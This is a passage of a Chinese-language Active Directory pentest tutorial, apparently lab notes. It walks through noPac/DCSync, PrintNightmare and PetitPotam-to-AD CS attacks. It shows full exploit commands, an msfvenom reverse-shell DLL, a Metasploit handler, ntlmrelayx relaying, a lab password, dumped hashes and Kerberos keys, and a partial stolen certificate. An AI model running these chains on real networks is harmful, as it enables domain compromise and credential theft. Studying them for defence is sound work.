<h3 id="noPac-DCSync"><a href="#noPac-DCSync" class="headerlink" title="noPac DCSync"></a>noPac DCSync</h3><p>然后，可以使用 ccache 文件执行传递票证并执行进一步的攻击，例如 DCSync。还可以使用带有<code>-dump</code>标志的工具使用 secretsdump.py 执行 DCSync。此方法仍会在磁盘上创建一个 ccache 文件，需要注意并清理它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h2 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p><code>PrintNightmare</code>是在所有 Windows 操作系统上运行的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc">打印后台处理程序服务</a>中发现的两个漏洞（ <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527</a>和<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">CVE-2021-1675</a> ）的昵称。许多漏洞都是基于这些漏洞编写的，这些漏洞允许提升权限和远程执行代码。</p>
<p>可能需要卸载攻击主机上的 Impacket 版本并安装 <a target="_blank" rel="noopener" href="https://twitter.com/cube0x0?lang=en">cube0x0 </a> 版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br><span class="line">git clone https://github.com/cube0x0/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python3 ./setup.py install</span><br></pre></td></tr></table></figure>

<h3 id="enum-7"><a href="#enum-7" class="headerlink" title="enum"></a>enum</h3><p>首先，使用<code>rpcdump.py</code>查看<code>Print System Asynchronous Protocol</code>和是否<code>Print System Remote Protocol</code>暴露在目标上。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rpcdump.py @172.16.5.5 | egrep &#x27;MS-RPRN|MS-PAR&#x27;</span><br><span class="line"></span><br><span class="line">Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol </span><br><span class="line">Protocol: [MS-RPRN]: Print System Remote Protocol </span><br></pre></td></tr></table></figure>

<p>确认这一点后，可以继续尝试利用漏洞。使用<code>msfvenom</code>来制作 DLL 有效负载。</p>
<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 8704 bytes</span><br></pre></td></tr></table></figure>

<p>然后，使用<code>smbserver.py</code>在攻击主机上创建的 SMB 共享中托管此有效负载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure>

<p>一旦创建共享并托管有效载荷，就可以使用 MSF 配置并启动一个多处理程序，负责捕获在目标上执行的反向 shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LHOST 172.16.5.225</span><br><span class="line">LHOST =&gt; 10.3.88.114</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LPORT 8080</span><br><span class="line">LPORT =&gt; 8080</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.5.225:8080 </span><br></pre></td></tr></table></figure>

<p>通过共享托管有效载荷，以及多处理程序监听连接，可以尝试对目标运行漏洞利用程序。以下命令是如何使用漏洞利用程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#x27;\\172.16.5.225\CompData\backupscript.dll&#x27;</span><br><span class="line"></span><br><span class="line">[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL</span><br><span class="line">[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll</span><br><span class="line">[*] Try 1...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 2...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 3...</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>请注意，在命令的末尾，包含了托管有效载荷的共享路径（<code>\\&lt;ip address of attack host&gt;\ShareName\nameofpayload.dll</code>）。如果运行漏洞利用后一切顺利，目标将访问共享并执行有效载荷。然后，有效载荷将回调到多处理程序，从而为提供提升的 SYSTEM shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (200262 bytes) to 172.16.5.5</span><br><span class="line">[*] Meterpreter session 1 opened (172.16.5.225:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; shell</span><br><span class="line">Process 5912 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.737]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>一旦漏洞利用程序运行，会注意到 Meterpreter 会话已启动。然后，可以进入 SYSTEM shell，并看到仅从标准域用户帐户开始就拥有目标域控制器上的 NT AUTHORITY\SYSTEM 权限。</p>
<h2 id="PetitPotam-MS-EFSRPC"><a href="#PetitPotam-MS-EFSRPC" class="headerlink" title="PetitPotam (MS-EFSRPC)"></a>PetitPotam (MS-EFSRPC)</h2><p>PetitPotam ( <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942">CVE-2021-36942</a> ) 是一个 LSA 欺骗漏洞，已于 2021 年 8 月修补。该漏洞允许未经身份验证的攻击者滥用 Microsoft的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31">加密文件系统远程协议 (MS-EFSRPC)</a>，通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc">本地安全机构远程协议 (LSARPC)</a>通过端口 445 使用 NTLM 强迫域控制器对另一台主机进行身份验证。此技术允许未经身份验证的攻击者接管正在使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs">Active Directory 证书服务 (AD CS)</a>的 Windows 域。在攻击中，来自目标域控制器的身份验证请求被中继到证书颁发机构 (CA) 主机的 Web 注册页面，并为新的数字证书发出证书签名请求 (CSR)。然后可以将此证书与<code>Rubeus</code> 或 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a> 中的<code>gettgtpkinit.py</code>等工具一起使用，为域控制器请求 TGT，然后可以使用该 TGT 通过 DCSync 攻击实现域入侵。</p>
<p>这篇<a target="_blank" rel="noopener" href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">博客文章</a>更详细地介绍了 NTLM 中继到 AD CS 和 PetitPotam 攻击。</p>
<h3 id="Intercept-Certificate"><a href="#Intercept-Certificate" class="headerlink" title="Intercept Certificate"></a>Intercept Certificate</h3><p>首先，需要在攻击主机上的一个窗口中启动<code>ntlmrelayx.py</code>，指定 CA 主机的 Web 注册 URL，并使用 KerberosAuthentication 或 DomainController AD CS 模板。如果不知道 CA 的位置，可以使用<a target="_blank" rel="noopener" href="https://github.com/zer1t0/certi">certi</a>等工具来尝试找到它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - </span><br><span class="line"></span><br><span class="line">Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br></pre></td></tr></table></figure>

<p>在另一个窗口中，运行工具<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam.py</a>。使用命令运行此工具<code>python3 PetitPotam.py &lt;attack host IP&gt; &lt;Domain Controller IP&gt;</code>，尝试强制域控制器对运行 ntlmrelayx.py 的主机进行身份验证。</p>
<p>此工具有一个可执行版本，可从 Windows 主机运行。身份验证触发器也已添加到 Mimikatz，可以使用加密文件系统 (EFS) 模块按如下方式运行：<code>misc::efs /server:&lt;Domain Controller&gt; /connect:&lt;ATTACK HOST&gt;</code>。该工具还有一个 PowerShell 实现<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1">Invoke-PetitPotam.ps1</a>。</p>
<p>在这里运行该工具并尝试通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8">EfsRpcOpenFileRaw</a>方法强制进行身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python3 PetitPotam.py 172.16.5.225 172.16.5.5</span><br><span class="line">                                                                                 </span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#x27;  \  </span><br><span class="line">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span><br><span class="line">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span><br><span class="line">          &quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27; </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC functions</span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line"></span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br></pre></td></tr></table></figure>

<p>回到另一个窗口，如果攻击成功，将看到成功的登录请求并获取域控制器的 base64 编码证书。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] Generating CSR...</span><br><span class="line">[*] CSR generated!</span><br><span class="line">[*] Getting certificate...</span><br><span class="line">[*] GOT CERTIFICATE!</span><br><span class="line">[*] Base64 certificate of user ACADEMY-EA-DC01$: </span><br><span class="line">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